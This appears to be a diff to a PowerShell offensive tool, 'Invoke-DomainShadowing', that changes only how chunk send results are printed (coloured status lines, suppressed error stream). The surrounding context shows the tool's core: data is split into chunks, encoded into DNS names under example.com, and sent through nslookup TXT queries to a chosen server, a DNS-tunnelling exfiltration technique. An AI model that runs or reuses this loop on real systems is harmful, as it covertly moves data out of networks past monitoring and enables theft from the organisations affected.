@@ -41,15 +41,20 @@ function Invoke-DomainShadowing {
     foreach ($chunk in $chunks) {
         $query = "$($chunk.Index).$($chunk.Data).example.com"  # Modify as needed to create a valid DNS name format
         try {
-            # Using nslookup to send DNS query
-            $nslookupResult = nslookup -type=txt $query $ServerAddress
+            # Using nslookup to send DNS query and redirecting error stream to null
+            $nslookupResult = nslookup -type=txt $query $ServerAddress 2>$null
             if ($nslookupResult -match "Non-existent domain|NXDOMAIN") {
-                Write-Output "Failed to send chunk $($chunk.Index): Non-existent domain"
+                $status = "Failed To Send"
+                $colorCode = "`e[31;40m"  # Red text on black background
             } else {
-                Write-Output "Successfully sent chunk $($chunk.Index)"
+                $status = "Successfully Sent"
+                $colorCode = "`e[32;40m"  # Green text on black background
             }
+            Write-Output @{"Chunk Status" = "[*] $($colorCode)$status`e[0m"; "Query" = "[*] $($colorCode)$query`e[0m"}
         } catch {
-            Write-Output "Error sending chunk $($chunk.Index): $_"
+            $status = "Failed To Send"
+            $colorCode = "`e[31;40m"  # Red text on black background
+            Write-Output @{"Chunk Status" = "[*] $($colorCode)$status`e[0m"; "Query" = "[*] $($colorCode)$query`e[0m"}
         }
     }
 }
